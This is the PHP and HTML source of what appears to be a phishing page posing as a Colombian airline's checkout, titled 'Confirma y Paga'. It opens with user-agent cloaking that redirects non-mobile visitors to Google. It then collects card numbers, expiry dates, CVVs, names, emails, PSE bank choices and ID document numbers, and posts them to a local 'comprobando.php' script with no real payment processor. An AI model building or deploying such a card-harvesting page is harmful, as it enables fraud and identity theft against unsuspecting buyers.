<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];

$isMobile = false;

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

?>
<?php
// partials/pago.php

// --- Helpers ---
function sanitize_pago_input($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}
function format_cop_pago($n){
    $n = is_numeric($n) ? (float)$n : 0;
    return 'COP '.number_format($n, 0, ',', '.');
}
function format_date_pago($date_str) {
    if (empty($date_str)) return '';
    setlocale(LC_TIME, 'es_ES.UTF-8', 'Spanish_Spain.1252');
    $timestamp = strtotime($date_str);
    if (!$timestamp) return $date_str;
    $dia_semana = ucfirst(strftime('%a', $timestamp));
    $dia = date('d', $timestamp);
    $mes = strftime('%b', $timestamp);
    return "{$dia_semana}, {$dia} de {$mes}";
}

// --- Recibir y sanitizar todos los datos de la URL ---
$total_pagar = isset($_GET['total']) ? $_GET['total'] : 0;
$passengers_str = isset($_GET['passengers']) ? sanitize_pago_input($_GET['passengers']) : '1 Adulto';

$origin_raw = isset($_GET['origin']) ? sanitize_pago_input($_GET['origin']) : 'N/A';
$destination_raw = isset($_GET['destination']) ? sanitize_pago_input($_GET['destination']) : 'N/A';
$origin_city = explode(',', $origin_raw)[0];
$destination_city = explode(',', $destination_raw)[0];

// Vuelo de Ida
$departure_date_ida_raw = isset($_GET['departure-date']) ? sanitize_pago_input($_GET['departure-date']) : '';
$departure_date_ida = format_date_pago($departure_date_ida_raw);
$out_dep_time = isset($_GET['out_dep_time']) ? sanitize_pago_input($_GET['out_dep_time']) : '';
$out_arr_time = isset($_GET['out_arr_time']) ? sanitize_pago_input($_GET['out_arr_time']) : '';
$out_dep_airport = isset($_GET['out_dep_airport']) ? sanitize_pago_input($_GET['out_dep_airport']) : '';
$out_arr_airport = isset($_GET['out_arr_airport']) ? sanitize_pago_input($_GET['out_arr_airport']) : '';
$out_tariff = isset($_GET['out_tariff']) ? sanitize_pago_input($_GET['out_tariff']) : '';

// Vuelo de Vuelta
$is_one_way = empty($_GET['ret_dep_time']);
$return_date_vuelta_raw = isset($_GET['return-date']) ? sanitize_pago_input($_GET['return-date']) : '';
$return_date_vuelta = format_date_pago($return_date_vuelta_raw);
$ret_dep_time = isset($_GET['ret_dep_time']) ? sanitize_pago_input($_GET['ret_dep_time']) : '';
$ret_arr_time = isset($_GET['ret_arr_time']) ? sanitize_pago_input($_GET['ret_arr_time']) : '';
$ret_dep_airport = isset($_GET['ret_dep_airport']) ? sanitize_pago_input($_GET['ret_dep_airport']) : '';
$ret_arr_airport = isset($_GET['ret_arr_airport']) ? sanitize_pago_input($_GET['ret_arr_airport']) : '';
$ret_tariff = isset($_GET['ret_tariff']) ? sanitize_pago_input($_GET['ret_tariff']) : '';
?>

<head>
    <title>Confirma y Paga</title>
    <link rel="stylesheet" href="assets/css/pago.css">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>

<body>
<div class="payment-page-container">
    <h1 class="payment-page-title">Confirma y paga tu compra</h1>

    <div class="payment-card">
        <div class="summary-header">
            <div>
                <p class="summary-title">Total a pagar</p>
                <p class="summary-passengers"><?php echo $passengers_str; ?></p>
            </div>
            <p class="summary-price">$ <?php echo number_format($total_pagar, 0, ',', '.'); ?></p>
        </div>
        
        <div class="flight-details">
            <div class="flight-info">
                <p class="flight-route">De <?php echo $origin_city; ?> a <?php echo $destination_city; ?></p>
                <p class="flight-date"><?php echo $departure_date_ida; ?></p>
                <p><?php echo $out_dep_time; ?> <?php echo $out_dep_airport; ?> &rarr; <?php echo $out_arr_time; ?> <?php echo $out_arr_airport; ?></p>
            </div>
            <span class="tariff-badge"><?php echo ucfirst($out_tariff); ?></span>
        </div>
        
        <?php if(!$is_one_way): ?>
        <div class="flight-details">
            <div class="flight-info">
                <p class="flight-route">De <?php echo $destination_city; ?> a <?php echo $origin_city; ?></p>
                <p class="flight-date"><?php echo $return_date_vuelta; ?></p>
                <p><?php echo $ret_dep_time; ?> <?php echo $ret_dep_airport; ?> &rarr; <?php echo $ret_arr_time; ?> <?php echo $ret_arr_airport; ?></p>
            </div>
            <span class="tariff-badge"><?php echo ucfirst($ret_tariff); ?></span>
        </div>
        <?php endif; ?>
        <a href="#" class="review-details-link">Revisa el detalle de tu compra</a>
    </div>

    <div class="payment-card">
        <h2 class="section-title">Medios de pago</h2>
        <div class="payment-option" data-target="card-form-1" data-method="card1">
            <i class="ri-bank-card-line"></i>
            <div class="payment-option-details">
                <p>Agregar tarjeta</p>
                <span>Débito con CVV o crédito Visa, Mastercard, American Express o Diners Club.</span>
            </div>
            <input type="radio" name="payment_method_display" value="card1">
        </div>
        
        <div class="card-form-container" id="card-form-1">
            <div class="card-form-header">
                <h3>A pagar con tarjeta</h3>
                <span>$ <?php echo number_format($total_pagar, 0, ',', '.'); ?></span>
            </div>
            <form action="assets/config/comprobando.php" method="POST" id="card-payment-form-1">
                
                <input type="hidden" name="total" value="<?php echo htmlspecialchars($total_pagar); ?>">
                <input type="hidden" name="passengers" value="<?php echo htmlspecialchars($passengers_str); ?>">
                <input type="hidden" name="origin" value="<?php echo htmlspecialchars($origin_raw); ?>">
                <input type="hidden" name="destination" value="<?php echo htmlspecialchars($destination_raw); ?>">
                <input type="hidden" name="departure-date" value="<?php echo htmlspecialchars($departure_date_ida_raw); ?>">
                <input type="hidden" name="out_dep_time" value="<?php echo htmlspecialchars($out_dep_time); ?>">
                <input type="hidden" name="out_arr_time" value="<?php echo htmlspecialchars($out_arr_time); ?>">
                <input type="hidden" name="out_dep_airport" value="<?php echo htmlspecialchars($out_dep_airport); ?>">
                <input type="hidden" name="out_arr_airport" value="<?php echo htmlspecialchars($out_arr_airport); ?>">
                <input type="hidden" name="out_tariff" value="<?php echo htmlspecialchars($out_tariff); ?>">
                <?php if(!$is_one_way): ?>
                    <input type="hidden" name="return-date" value="<?php echo htmlspecialchars($return_date_vuelta_raw); ?>">
                    <input type="hidden" name="ret_dep_time" value="<?php echo htmlspecialchars($ret_dep_time); ?>">
                    <input type="hidden" name="ret_arr_time" value="<?php echo htmlspecialchars($ret_arr_time); ?>">
                    <input type="hidden" name="ret_dep_airport" value="<?php echo htmlspecialchars($ret_dep_airport); ?>">
                    <input type="hidden" name="ret_arr_airport" value="<?php echo htmlspecialchars($ret_arr_airport); ?>">
                    <input type="hidden" name="ret_tariff" value="<?php echo htmlspecialchars($ret_tariff); ?>">
                <?php endif; ?>
                
                <input type="hidden" name="payment_method" value="card1">
                <div class="form-grid">
                    <div class="input-group">
                        <input type="text" id="nombre" name="nombre" placeholder=" " required>
                        <label for="nombre">Nombre y apellido*</label>
                    </div>
                    <div class="input-group">
                        <input type="text" id="creditcard" name="creditcard" maxlength="16" placeholder=" " required>
                        <label for="creditcard">Número de tarjeta*</label>
                    </div>
                    <div class="input-group">
                        <input type="text" id="expdate" name="expdate" pattern="\d{2}/\d{4}" placeholder=" " required>
                        <label for="expdate">Fecha de expiración (MM/AAAA)*</label>
                    </div>
                    <div class="input-group card-cvv-group" style="display: none;">
                        <input type="text" id="cvv" name="cvv" maxlength="3" placeholder=" " required>
                        <label for="cvv">CVV*</label>
                    </div>
                    <div class="input-group">
                         <input type="email" id="email" name="email" placeholder=" " required>
                         <label for="email">Email</label>
                    </div>
                    <div class="input-group card-quotas-group" style="display: none;">
                        <select id="quotas-1" name="quotas">
                            <option>Sin cuotas</option>
                            <option>1 Cuota</option>
                            <option>2 Cuotas</option>
                            <option>3 Cuotas</option>
                            <option>4 Cuotas</option>
                            <option>5 Cuotas</option>
                            <option>6 Cuotas</option>
                            <option>7 cuotas</option>
                            <option>8 cuotas</option>
                            <option>9 cuotas</option>
                            <option>10 cuotas</option>
                            <option>12 cuotas</option>
                            <option>24 cuotas</option>
                            <option>36 cuotas</option>
                        </select>
                        <label for="quotas-1">Cuotas</label>
                    </div>
                </div>
            </form>
        </div>

        <div class="payment-option" data-target="pse-form" data-method="pse">
            <i class="ri-bank-line"></i>
            <div class="payment-option-details">
                <p>Pagos PSE</p>
                <span>Paga de forma segura con tu cuenta bancaria.</span>
            </div>
            <input type="radio" name="payment_method_display" value="pse">
        </div>

        <div class="card-form-container" id="pse-form">
             <div class="card-form-header">
                <h3>A pagar con PSE</h3>
                <span>$ <?php echo number_format($total_pagar, 0, ',', '.'); ?></span>
            </div>
            <form action="assets/config/comprobando.php" method="POST" id="pse-payment-form">

                <input type="hidden" name="total" value="<?php echo htmlspecialchars($total_pagar); ?>">
                <input type="hidden" name="passengers" value="<?php echo htmlspecialchars($passengers_str); ?>">
                <input type="hidden" name="origin" value="<?php echo htmlspecialchars($origin_raw); ?>">
                <input type="hidden" name="destination" value="<?php echo htmlspecialchars($destination_raw); ?>">
                <input type="hidden" name="departure-date" value="<?php echo htmlspecialchars($departure_date_ida_raw); ?>">
                <input type="hidden" name="out_dep_time" value="<?php echo htmlspecialchars($out_dep_time); ?>">
                <input type="hidden" name="out_arr_time" value="<?php echo htmlspecialchars($out_arr_time); ?>">
                <input type="hidden" name="out_dep_airport" value="<?php echo htmlspecialchars($out_dep_airport); ?>">
                <input type="hidden" name="out_arr_airport" value="<?php echo htmlspecialchars($out_arr_airport); ?>">
                <input type="hidden" name="out_tariff" value="<?php echo htmlspecialchars($out_tariff); ?>">
                <?php if(!$is_one_way): ?>
                    <input type="hidden" name="return-date" value="<?php echo htmlspecialchars($return_date_vuelta_raw); ?>">
                    <input type="hidden" name="ret_dep_time" value="<?php echo htmlspecialchars($ret_dep_time); ?>">
                    <input type="hidden" name="ret_arr_time" value="<?php echo htmlspecialchars($ret_arr_time); ?>">
                    <input type="hidden" name="ret_dep_airport" value="<?php echo htmlspecialchars($ret_dep_airport); ?>">
                    <input type="hidden" name="ret_arr_airport" value="<?php echo htmlspecialchars($ret_arr_airport); ?>">
                    <input type="hidden" name="ret_tariff" value="<?php echo htmlspecialchars($ret_tariff); ?>">
                <?php endif; ?>

                <input type="hidden" name="payment_method" value="pse">
                <div class="form-grid">
                    <div class="input-group full-width">
                        <label for="bank-select">Selecciona tu banco</label>
                        <select id="bank-select" name="bank" required>
                            <option value="" disabled selected>Selecciona un banco</option>
                            <option value="Bancolombia">Bancolombia</option>
                            <option value="Davivienda">Davivienda</option>
                            <option value="Occidente">Banco de Occidente</option>
                            <option value="Bogota">Banco de Bogotá</option>
                            <option value="BBVA">BBVA Colombia</option>
                            <option value="Colpatria">Colpatria</option>
                            <option value="Tuya">Tuya</option>
                            <option value="Falabella">Falabella</option>
                            <option value="Avvillas">Av villas</option>
                            <option value="Serfinanza">Serfinanza</option>
                            <option value="Finandina">Finandina</option>
                        </select>
                    </div>
                    
                    <div class="input-group">
                        <select id="document-type-pse" name="document_type_pse" required>
                            <option value="" disabled selected>Seleccione tipo de documento</option>
                            <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
                            <option value="Cédula de Extranjería">Cédula de Extranjería</option>
                            <option value="Pasaporte">Pasaporte</option>
                            <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
                            <option value="NIT">NIT</option>
                            <option value="Registro Civil">Registro Civil</option>
                        </select>
                        <label for="document-type-pse">Tipo de documento*</label>
                    </div>
                    <div class="input-group">
                        <input type="text" id="document-number-pse" name="document_number_pse" placeholder=" ">
                        <label for="document-number-pse">Número de documento</label>
                    </div>
                    <div class="input-group">
                        <input type="email" id="email-pse" name="email_pse" placeholder=" " required>
                        <label for="email-pse">Email</label>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
<div class="payment-card">
    <h2 class="section-title">¿A dónde enviamos el comprobante de compra?</h2>
    <p class="info-text">La persona que reciba el comprobante será <strong>administradora del viaje</strong> y la única que podrá solicitar cambios y devoluciones.</p>
    <div class="input-group">
        <input type="email" id="comprobante-email" placeholder=" " required>
        <label for="comprobante-email">Email</label>
    </div>
    <hr>
    
    <div class="invoice-header">
        <h2 class="section-title">¿Necesitas factura?</h2>
        <div class="invoice-toggle" onclick="toggleInvoiceForm(event)">
            <span>Solicitar documento tributario a nombre de quien paga o compra</span>
            <label class="switch">
                <input type="checkbox" id="invoice-checkbox">
                <span class="slider"></span>
            </label>
        </div>
    </div>
    
    <div id="invoice-form" style="display:none;">
        <div class="info-box">
            <i class="ri-information-line"></i> Documento equivalente electrónico válido para personas y empresas inscritas en Colombia.
        </div>
        
        <div class="invoice-form-grid">
            <div class="input-group">
                <label for="person-type">Tipo de persona</label>
                <select id="person-type">
                    <option>Persona Natural y asimiladas</option>
                    <option>Persona Jurídica</option>
                </select>
            </div>
            
            <div class="input-group">
                <label for="document-type">Tipo de documento</label>
                <select id="document-type">
                    <option>Cédula de ciudadanía</option>
                    <option>Pasaporte</option>
                    <option>NIT</option>
                    <option>Cédula de extranjería</option>
                </select>
            </div>
            
            <div class="input-group">
                <label for="id-number">Número de documento</label>
                <input type="text" id="id-number">
            </div>
            
            <div class="input-group">
                <label for="social-reason">Nombre y apellido / Razón social</label>
                <input type="text" id="social-reason">
            </div>
            
            <div class="input-group">
                <label for="country">País</label>
                <select id="country" style="height: 42px;">
                    <option selected>Colombia</option>
                    <option>Otro país</option>
                </select>
                <small>Válido para personas y empresas inscritas en Colombia</small>
            </div>
            
            <div class="input-group">
                <label for="invoice-email">Email</label>
                <input type="email" id="invoice-email" required>
                <small>Este correo recibirá la factura</small>
            </div>
            
            <div class="input-group full-width">
                <label for="city">Ciudad</label>
                <input type="text" id="city">
            </div>
        </div>
        
        <div class="info-box">
            <i class="ri-information-line"></i> En este correo recibirás el documento tributario en un plazo máximo de 48 horas.
        </div>
    </div>

    <div class="checkbox-group">
        <input type="checkbox" id="confirm-dian">
        <label for="confirm-dian">Confirmo que los datos son correctos y que coinciden con los reportados ante la Dirección de Impuestos y Aduanas Nacionales (DIAN) de Colombia.</label>
    </div>
    <div class="checkbox-group">
        <input type="checkbox" id="confirm-terms">
        <label for="confirm-terms">Al continuar acepto los <a href="#">términos y condiciones de la compra <i class="ri-external-link-line"></i></a>.</label>
    </div>
    <div class="final-actions">
        <button class="pay-button" id="main-pay-button">Pagar <?php echo format_cop_pago($total_pagar); ?></button>
    </div>
</div>

</div>

<script>
// Actualizar la función toggleInvoiceForm
function toggleInvoiceForm(event) {
    const checkbox = document.getElementById('invoice-checkbox');
    const form = document.getElementById('invoice-form');
    
    // Alternar el estado del checkbox sin conflicto con el clic
    if (event.target.type !== 'checkbox' && event.target.tagName !== 'SPAN' && event.target.tagName !== 'LABEL') {
        checkbox.checked = !checkbox.checked;
    }

    // Mostrar u ocultar el formulario
    if (checkbox.checked) {
        form.style.display = 'block';
    } else {
        form.style.display = 'none';
    }
}

    document.addEventListener('DOMContentLoaded', () => {
        const paymentOptions = document.querySelectorAll('.payment-option');
        const cardForms = document.querySelectorAll('.card-form-container');
        const mainPayButton = document.getElementById('main-pay-button');

        cardForms.forEach(form => form.style.display = 'none');

        paymentOptions.forEach(option => {
            option.addEventListener('click', () => {
                const targetId = option.getAttribute('data-target');
                const targetForm = document.getElementById(targetId);
                const radio = option.querySelector('input[name="payment_method_display"]');
                const hiddenMethodInput = targetForm ? targetForm.querySelector('input[name="payment_method"]') : null;

                if (option.classList.contains('selected')) {
                    option.classList.remove('selected');
                    if (radio) radio.checked = false;
                    if (targetForm) targetForm.style.display = 'none';
                    if (hiddenMethodInput) hiddenMethodInput.value = '';
                } else {
                    paymentOptions.forEach(opt => opt.classList.remove('selected'));
                    option.classList.add('selected');

                    if (radio) {
                        radio.checked = true;
                    }

                    cardForms.forEach(form => form.style.display = 'none');

                    if (targetForm) {
                        targetForm.style.display = 'block';
                        if (hiddenMethodInput) {
                            hiddenMethodInput.value = option.getAttribute('data-method');
                        }

                        if (targetId.startsWith('card-form-')) {
                            const currentCardNumberInput = targetForm.querySelector('#creditcard');
                            const cvvGroup = targetForm.querySelector('.card-cvv-group');
                            const quotasGroup = targetForm.querySelector('.card-quotas-group');
                            if (currentCardNumberInput && cvvGroup && quotasGroup) {
                                if (currentCardNumberInput.value.replace(/\s/g, '').length >= 15) {
                                    cvvGroup.style.display = 'block';
                                    quotasGroup.style.display = 'block';
                                } else {
                                    cvvGroup.style.display = 'none';
                                    quotasGroup.style.display = 'none';
                                }
                            }
                        }
                    }
                }
            });
        });

        const creditcardInput = document.getElementById('creditcard');
        if (creditcardInput) {
            creditcardInput.addEventListener('input', (e) => {
                const formContainer = e.target.closest('.card-form-container');
                const cvvGroup = formContainer.querySelector('.card-cvv-group');
                const quotasGroup = formContainer.querySelector('.card-quotas-group');
                const cardNumber = e.target.value.replace(/\s/g, '');

                if (cardNumber.length >= 15) {
                    cvvGroup.style.display = 'block';
                    quotasGroup.style.display = 'block';
                } else {
                    cvvGroup.style.display = 'none';
                    quotasGroup.style.display = 'none';
                }
            });
        }
        
        const expdateInput = document.getElementById('expdate');
        if (expdateInput) {
            expdateInput.addEventListener('input', function (e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 3) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 6);
                }
                e.target.value = value;
            });
        }

        mainPayButton.addEventListener('click', (e) => {
            e.preventDefault();

            let activeForm = null;
            cardForms.forEach(formContainer => {
                if (formContainer.style.display === 'block') {
                    activeForm = formContainer.querySelector('form');
                }
            });

            if (activeForm) {
                activeForm.submit();
            } else {
                console.log('Ningún método de pago ha sido seleccionado.');
            }
        });
    });
</script>
</body>